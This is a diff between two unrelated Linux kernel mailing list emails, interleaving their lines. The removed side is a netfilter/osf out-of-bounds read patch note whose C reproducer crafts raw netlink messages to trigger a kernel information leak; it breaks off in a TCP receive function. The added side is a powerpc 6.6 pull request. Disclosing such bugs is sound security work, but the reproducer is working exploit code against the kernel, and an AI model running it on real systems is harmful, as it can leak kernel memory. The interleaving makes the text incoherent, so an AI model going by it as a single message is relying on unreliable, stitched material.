@@ -2,790 +2,949 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id A455378ED66
-	for <lists+linux-kernel@lfdr.de>; Thu, 31 Aug 2023 14:40:33 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 3294A78ED74
+	for <lists+linux-kernel@lfdr.de>; Thu, 31 Aug 2023 14:42:39 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1345521AbjHaMkc (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Thu, 31 Aug 2023 08:40:32 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:41624 "EHLO
+        id S235101AbjHaMmh (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Thu, 31 Aug 2023 08:42:37 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50924 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229593AbjHaMkb (ORCPT
+        with ESMTP id S230135AbjHaMmg (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Thu, 31 Aug 2023 08:40:31 -0400
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id BC3A0CDB
-        for <linux-kernel@vger.kernel.org>; Thu, 31 Aug 2023 05:39:46 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-        s=mimecast20190719; t=1693485585;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:
-         content-transfer-encoding:content-transfer-encoding;
-        bh=Etwlx/UHgM9R2udEJs3o1UHL8QgwlnawNWOoo8yeMfQ=;
-        b=HgDurhvi3GtyUAiHXoz2CRgDbzY0PyzqApEUcrBHRxmzTXEmB4pqne+L7I7cRdG92m+Lz4
-        lzq7mHwdhWK3suBtDBB2tCWdZ5CkBmqDBms2zkQWt5DaRyVqApe5YJY85ZGyP9HjBYCUoq
-        IeKnxhPyeqrJ0a7MgugucFKXwexPtLs=
-Received: from mimecast-mx02.redhat.com (mimecast-mx02.redhat.com
- [66.187.233.88]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- us-mta-279-wGWLLj92OLW2mg11uVzY_w-1; Thu, 31 Aug 2023 08:39:42 -0400
-X-MC-Unique: wGWLLj92OLW2mg11uVzY_w-1
-Received: from smtp.corp.redhat.com (int-mx08.intmail.prod.int.rdu2.redhat.com [10.11.54.8])
-        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+        Thu, 31 Aug 2023 08:42:36 -0400
+Received: from gandalf.ozlabs.org (gandalf.ozlabs.org [150.107.74.76])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 640B11A4
+        for <linux-kernel@vger.kernel.org>; Thu, 31 Aug 2023 05:42:30 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ellerman.id.au;
+        s=201909; t=1693485749;
+        bh=4MCvfwqD68QQcBKEr2kYK4/l8xZk7Ljtk71mwv2ticQ=;
+        h=From:To:Cc:Subject:Date:From;
+        b=FvM0PjgTsKFd4zmTY6isaOi7Oav5PN9QB53UWCcoBLd6Ww/nNswNQOKDjcZXk9V2+
+         /R89so1NIjyFtKyQJqVwD2ncBYr9J9+Hw+losp0KyST/GkWgAWeWtdWb+JP+ZYDAP+
+         9cMinNNSgTzHzfIzeu0Bk26tMcm4xK8Hd8FT5/lwJKbvWnteSWIzN3Klayp7fuvi+4
+         WCmmUs/wOfXysff4QswMQQJ9KXqap5T4uvibWnc58PgY2Fc0Uhvyk8HfFQbf3vNKDN
+         3/fdUO/guRB+1o1XaiZtJH/mgLsnVeSxDYEQcmRp1IYbzYQi6uMJ7DXXoLgnUP1fLn
+         DGxGReq6zjDWA==
+Received: from authenticated.ozlabs.org (localhost [127.0.0.1])
+        (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+         key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
         (No client certificate requested)
-        by mimecast-mx02.redhat.com (Postfix) with ESMTPS id C0CB98030AC;
-        Thu, 31 Aug 2023 12:39:41 +0000 (UTC)
-Received: from fedora.redhat.com (unknown [10.22.8.87])
-        by smtp.corp.redhat.com (Postfix) with ESMTP id B97ACC15BB8;
-        Thu, 31 Aug 2023 12:39:37 +0000 (UTC)
-From:   Wander Lairson Costa <wander@redhat.com>
-To:     Pablo Neira Ayuso <pablo@netfilter.org>,
-        Jozsef Kadlecsik <kadlec@netfilter.org>,
-        Florian Westphal <fw@strlen.de>,
-        "David S. Miller" <davem@davemloft.net>,
-        Eric Dumazet <edumazet@google.com>,
-        Jakub Kicinski <kuba@kernel.org>,
-        Paolo Abeni <pabeni@redhat.com>,
-        Fernando Fernandez Mancera <ffmancera@riseup.net>,
-        netfilter-devel@vger.kernel.org (open list:NETFILTER),
-        coreteam@netfilter.org (open list:NETFILTER),
-        netdev@vger.kernel.org (open list:NETWORKING [GENERAL]),
-        linux-kernel@vger.kernel.org (open list)
-Cc:     Wander Lairson Costa <wander@redhat.com>,
-        Lucas Leong <wmliang@infosec.exchange>, stable@kernel.org
-Subject: [PATCH nf v2] netfilter/osf: avoid OOB read
-Date:   Thu, 31 Aug 2023 09:39:30 -0300
-Message-ID: <20230831123931.60606-1-wander@redhat.com>
+        by mail.ozlabs.org (Postfix) with ESMTPSA id 4Rc15Z0J0hz4wxW;
+        Thu, 31 Aug 2023 22:42:26 +1000 (AEST)
+From:   Michael Ellerman <mpe@ellerman.id.au>
+To:     Linus Torvalds <torvalds@linux-foundation.org>
+Cc:     ajd@linux.ibm.com, aneesh.kumar@linux.ibm.com, arnd@arndb.de,
+        bgray@linux.ibm.com, bhelgaas@google.com,
+        christophe.leroy@csgroup.eu, fbarrat@linux.ibm.com,
+        gautam@linux.ibm.com, hbathini@linux.ibm.com, joel@jms.id.au,
+        justinstitt@google.com, kjain@linux.ibm.com,
+        krzysztof.kozlowski@linaro.org, ldufour@linux.ibm.com,
+        linus.walleij@linaro.org, linux-kernel@vger.kernel.org,
+        linuxppc-dev@lists.ozlabs.org, mahesh@linux.ibm.com,
+        masahiroy@kernel.org, mirimmad17@gmail.com, msuchanek@suse.de,
+        nathanl@linux.ibm.com, naveen@kernel.org, ndesaulniers@google.com,
+        npiggin@gmail.com, osandov@fb.com, rdunlap@infradead.org,
+        robh@kernel.org, ruanjinjie@huawei.com, ruscur@russell.cc,
+        sourabhjain@linux.ibm.com, tanyuan@tinylab.org, twoerner@gmail.com,
+        u.kleine-koenig@pengutronix.de, vaibhav@linux.ibm.com,
+        wangxiongfeng2@huawei.com, windhl@126.com,
+        zhangjialin11@huawei.com, zhengzengkai@huawei.com
+Subject: [GIT PULL] Please pull powerpc/linux.git powerpc-6.6-1 tag
+Date:   Thu, 31 Aug 2023 22:42:24 +1000
+Message-ID: <87o7in1iz3.fsf@mail.lhotse>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-X-Scanned-By: MIMEDefang 3.1 on 10.11.54.8
-X-Spam-Status: No, score=-1.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,HEXHASH_WORD,
-        RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H4,RCVD_IN_MSPIKE_WL,SPF_HELO_NONE,
-        SPF_NONE autolearn=no autolearn_force=no version=3.4.6
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_BLOCKED,
+        SPF_HELO_PASS,SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-The opt_num field is controlled by user mode and is not currently
-validated inside the kernel. An attacker can take advantage of this to
-trigger an OOB read and potentially leak information.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Reproducer:
 
-void install_filter_for_leak()
-{
-	char buf[0x1000] = {0};
-        struct iovec io = {
-		.iov_base = buf,
-		.iov_len = sizeof(buf)
-        };
-        struct msghdr msg = {0};
-        msg.msg_iov = &io;
-        msg.msg_iovlen = 1;
+Hi Linus,
 
-	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
-	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
+Please pull powerpc updates for 6.6.
 
-	memset(buf, 0, sizeof(buf));
-	*(uint32_t*)(buf) = 0x14;
-	*(uint16_t*)(buf+4) = 0x10;
-	*(uint16_t*)(buf+6) = 1;
-	*(uint32_t*)(buf+8) = 0x63072925;
-	*(uint16_t*)(buf+0x12) = 0xa;
-	*(uint32_t*)(buf+0x14) = 0x20;
-	*(uint16_t*)(buf+0x18) = 0xa00;
-	*(uint16_t*)(buf+0x1a) = 0x5;
-	*(uint32_t*)(buf+0x1c) = 0x63072926;
-	*(uint8_t*)(buf+0x24) = 2;
+There's a conflict in drivers/net/ethernet/freescale/fs_enet/fs_enet.h, whe=
+re
+the correct resolution is to drop the include of both linux/fs_enet_pd.h and
+asm/fs_pd.h.
 
-	*(uint16_t*)(buf+0x28) = 0xb;
-	*(uint16_t*)(buf+0x2a) = 1;
-	strcpy((void*)(buf+0x2c), "filter");
+There's a trivial conflict in arch/powerpc/Kconfig.
 
-	*(uint32_t*)(buf+0x34) = 0x14;
-	*(uint16_t*)(buf+0x38) = 0x11;
-	*(uint16_t*)(buf+0x3a) = 1;
-	*(uint32_t*)(buf+0x3c) = 0x63072927;
-	*(uint16_t*)(buf+0x46) = 0xa;
-	io.iov_len = 0x48;
-        sendmsg(fd, &msg, 0);
+There will be a conflict when you merge the tty tree, in arch/powerpc/inclu=
+de/asm/fs_pd.h,
+the resolution is just to take the union of all the removals leaving the fi=
+le
+almost empty and unused, we will remove it in a follow-up patch.
+=20
 
-	memset(buf, 0, sizeof(buf));
-	*(uint32_t*)(buf) = 0x14;
-	*(uint16_t*)(buf+4) = 0x10;
-	*(uint16_t*)(buf+6) = 1;
-	*(uint32_t*)(buf+8) = 0x63072925;
-	*(uint16_t*)(buf+0x12) = 0xa;
-	*(uint16_t*)(buf+0x14) = 0x40;
-	*(uint16_t*)(buf+0x18) = 0xa03;
-	*(uint16_t*)(buf+0x1a) = 0x5;
-	*(uint32_t*)(buf+0x1c) = 0x63072926;
-	*(uint32_t*)(buf+0x24) = 2;
+Notable out of area changes:
+  include/linux/hw_breakpoint.h	# 53834a0c0925 perf/hw_breakpoint: Remove a=
+rch breakpoint hooks
+  kernel/events/hw_breakpoint.c	# 53834a0c0925 perf/hw_breakpoint: Remove a=
+rch breakpoint hooks
+  drivers/net/ethernet/freescale/fs_enet/fs_enet.h	# 60bc069c433f powerpc/i=
+nclude: Remove unneeded #include <asm/fs_pd.h>
+  drivers/net/ethernet/freescale/fs_enet/mac-fcc.c	# fecc436a97af powerpc/i=
+nclude: Remove mpc8260.h and m82xx_pci.h
 
-	*(uint16_t*)(buf+0x28) = 0xb;
-	*(uint16_t*)(buf+0x2a) = 1;
-	strcpy((void*)(buf+0x2c), "filter");
-	*(uint16_t*)(buf+0x34) = 0xa;
-	*(uint16_t*)(buf+0x36) = 3;
-	strcpy((void*)(buf+0x38), "input");
-	*(uint16_t*)(buf+0x40) = 0x14;
-	*(uint16_t*)(buf+0x42) = 0x8004;
-	*(uint16_t*)(buf+0x44) = 8;
-	*(uint16_t*)(buf+0x46) = 1;
-	*(uint32_t*)(buf+0x48) = 0x1000000;
-	*(uint16_t*)(buf+0x4c) = 8;
-	*(uint16_t*)(buf+0x4e) = 2;
-	*(uint32_t*)(buf+0x50) = 0;
+cheers
 
-	*(uint32_t*)(buf+0x54) = 0x14;
-	*(uint16_t*)(buf+0x58) = 0x11;
-	*(uint16_t*)(buf+0x5a) = 1;
-	*(uint32_t*)(buf+0x5c) = 0x63072f50;
-	*(uint16_t*)(buf+0x66) = 0xa;
-	io.iov_len = 0x68;
-        sendmsg(fd, &msg, 0);
 
-	memset(buf, 0, sizeof(buf));
-	*(uint32_t*)(buf) = 0x14;
-	*(uint16_t*)(buf+4) = 0x10;
-	*(uint16_t*)(buf+6) = 1;
-	*(uint32_t*)(buf+8) = 0x63072925;
-	*(uint16_t*)(buf+0x12) = 0xa;
-	*(uint16_t*)(buf+0x14) = 0x40;
-	*(uint16_t*)(buf+0x18) = 0xa03;
-	*(uint16_t*)(buf+0x1a) = 5;
-	*(uint32_t*)(buf+0x1c) = 0x63072926;
-	*(uint32_t*)(buf+0x24) = 2;
-	*(uint16_t*)(buf+0x28) = 0xb;
-	*(uint16_t*)(buf+0x2a) = 1;
-	strcpy((void*)(buf+0x2c), "filter");
-	*(uint16_t*)(buf+0x34) = 0xb;
-	*(uint16_t*)(buf+0x36) = 3;
-	strcpy((void*)(buf+0x38), "output");
-	*(uint16_t*)(buf+0x40) = 0x14;
-	*(uint16_t*)(buf+0x42) = 0x8004;
-	*(uint16_t*)(buf+0x44) = 8;
-	*(uint16_t*)(buf+0x46) = 1;
-	*(uint32_t*)(buf+0x48) = 0x3000000;
-	*(uint16_t*)(buf+0x4c) = 8;
-	*(uint16_t*)(buf+0x4e) = 2;
-	*(uint32_t*)(buf+0x50) = 0;
+The following changes since commit 6eaae198076080886b9e7d57f4ae06fa782f90ef:
 
-	*(uint32_t*)(buf+0x54) = 0x14;
-	*(uint16_t*)(buf+0x58) = 0x11;
-	*(uint16_t*)(buf+0x5a) = 1;
-	*(uint32_t*)(buf+0x5c) = 0x63072f50;
-	*(uint16_t*)(buf+0x66) = 0xa;
-	io.iov_len = 0x68;
-        sendmsg(fd, &msg, 0);
+  Linux 6.5-rc3 (2023-07-23 15:24:10 -0700)
 
-	memset(buf, 0, sizeof(buf));
-	*(uint32_t*)(buf) = 0x14;
-	*(uint16_t*)(buf+4) = 0x10;
-	*(uint16_t*)(buf+6) = 1;
-	*(uint32_t*)(buf+8) = 0x63072925;
-	*(uint16_t*)(buf+0x12) = 0xa;
-	*(uint16_t*)(buf+0x14) = 0x2c;
-	*(uint16_t*)(buf+0x18) = 0xa03;
-	*(uint16_t*)(buf+0x1a) = 0x5;
-	*(uint32_t*)(buf+0x1c) = 0x63072926;
-	*(uint32_t*)(buf+0x24) = 2;
-	*(uint16_t*)(buf+0x28) = 0xb;
-	*(uint16_t*)(buf+0x2a) = 1;
-	strcpy((void*)(buf+0x2c), "filter");
-	*(uint16_t*)(buf+0x34) = 0x9;
-	*(uint16_t*)(buf+0x36) = 3;
-	strcpy((void*)(buf+0x38), "leak");
+are available in the git repository at:
 
-	*(uint32_t*)(buf+0x40) = 0x14;
-	*(uint16_t*)(buf+0x44) = 0x11;
-	*(uint16_t*)(buf+0x46) = 1;
-	*(uint32_t*)(buf+0x48) = 0x63072f50;
-	*(uint16_t*)(buf+0x52) = 0xa;
-	io.iov_len = 0x54;
-        sendmsg(fd, &msg, 0);
+  https://git.kernel.org/pub/scm/linux/kernel/git/powerpc/linux.git tags/po=
+werpc-6.6-1
 
-	char buf5[] = {
-		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
-		0x74, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00, 0x1c, 0x01, 0x00, 0x00,
-		0x06, 0x0a, 0x05, 0x0c, 0x75, 0x41, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
-		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
-		0x65, 0x72, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00,
-		0x69, 0x6e, 0x70, 0x75, 0x74, 0x00, 0x00, 0x00,
-		0xf0, 0x00, 0x04, 0x80, 0x24, 0x00, 0x01, 0x80,
-		0x09, 0x00, 0x01, 0x00, 0x6d, 0x65, 0x74, 0x61,
-		0x00, 0x50, 0x02, 0x00, 0x14, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
-		0x06, 0xb0, 0x1b, 0x00, 0x34, 0x00, 0x01, 0x80,
-		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
-		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
-		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
-		0x18, 0xd3, 0x01, 0x00, 0x3c, 0x00, 0x01, 0x80,
-		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
-		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x00, 0x00,
-		0x28, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x02, 0x80,
-		0x18, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0xff, 0xff, 0xff, 0xfd, 0x09, 0x00, 0x02, 0x00,
-		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
-		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
-		0x76, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00};
-	memset(buf, 0, sizeof(buf));
-	memcpy(buf, buf5, sizeof(buf5));
-	io.iov_len = 0x144;
-        sendmsg(fd, &msg, 0);
+for you to fetch changes up to 85a616416e9e01db0bfa92f26457e92642e2236b:
 
-	char buf6[] = {
-		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
-		0xd9, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00, 0x54, 0x01, 0x00, 0x00,
-		0x06, 0x0a, 0x05, 0x0c, 0xda, 0x4e, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
-		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
-		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
-		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
-		0x28, 0x01, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
-		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
-		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03,
-		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
-		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
-		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x05, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
-		0x00, 0x00, 0x00, 0x0d, 0x08, 0x00, 0x04, 0x00,
-		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
-		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
-		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x08,
-		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
-		0x02, 0x00, 0x02, 0x80, 0x2c, 0x00, 0x01, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x63, 0x6d, 0x70, 0x00,
-		0x20, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
-		0x00, 0x00, 0x00, 0x01, 0x0c, 0x00, 0x03, 0x80,
-		0x05, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00,
-		0x30, 0x00, 0x01, 0x80, 0x0e, 0x00, 0x01, 0x00,
-		0x69, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74,
-		0x65, 0x00, 0x02, 0x00, 0x1c, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0x10, 0x00, 0x02, 0x80, 0x0c, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
-		0xdb, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00};
-	memset(buf, 0, sizeof(buf));
-	memcpy(buf, buf6, sizeof(buf6));
-	io.iov_len = 0x17c;
-        sendmsg(fd, &msg, 0);
+  macintosh/ams: linux/platform_device.h is needed (2023-08-31 21:23:13 +10=
+00)
 
-	char buf7[] = {
-		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
-		0x7c, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00, 0x50, 0x00, 0x00, 0x00,
-		0x06, 0x0a, 0x05, 0x0c, 0x7d, 0x64, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
-		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
-		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
-		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
-		0x24, 0x00, 0x04, 0x80, 0x20, 0x00, 0x01, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x6f, 0x73, 0x66, 0x00,
-		0x14, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x03, 0x00,
-		0x00, 0x00, 0x00, 0x01, 0x14, 0x00, 0x00, 0x00,
-		0x11, 0x00, 0x01, 0x00, 0x7e, 0x64, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
-	};
-	memset(buf, 0, sizeof(buf));
-	memcpy(buf, buf7, sizeof(buf7));
-	io.iov_len = 0x78;
-        sendmsg(fd, &msg, 0);
+- ------------------------------------------------------------------
+powerpc updates for 6.6
 
-	char buf8[] = {
-		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
-		0xc9, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
-		0x00, 0x00, 0x0a, 0x00, 0x28, 0x01, 0x00, 0x00,
-		0x06, 0x0a, 0x05, 0x0c, 0xca, 0x64, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
-		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
-		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
-		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
-		0xfc, 0x00, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
-		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
-		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x04,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x20,
-		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x10,
-		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
-		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
-		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
-		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x04, 0x00,
-		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
-		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
-		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
-		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
-		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
-		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
-		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
-		0x18, 0x00, 0x02, 0x80, 0x30, 0x00, 0x01, 0x80,
-		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
-		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x01, 0x00,
-		0x1c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x80,
-		0x0c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
-		0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
-		0x11, 0x00, 0x01, 0x00, 0xcb, 0x64, 0x07, 0x63,
-		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
-	};
-	memset(buf, 0, sizeof(buf));
-	memcpy(buf, buf8, sizeof(buf8));
-	io.iov_len = 0x150;
-        sendmsg(fd, &msg, 0);
-}
+ - Add HOTPLUG_SMT support (/sys/devices/system/cpu/smt) and honour the
+   configured SMT state when hotplugging CPUs into the system.
 
-void *tcp_recv(void * data){
+ - Combine final TLB flush and lazy TLB mm shootdown IPIs when using the Ra=
+dix
+   MMU to avoid a broadcast TLBIE flush on exit.
 
-	int sockfd, connfd;
-	struct sockaddr_in servaddr;
-	int len, n;
+ - Drop the exclusion between ptrace/perf watchpoints, and drop the now unu=
+sed
+   associated arch hooks.
 
-	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
-		perror("socket creation failed");
-		exit(EXIT_FAILURE);
-	}
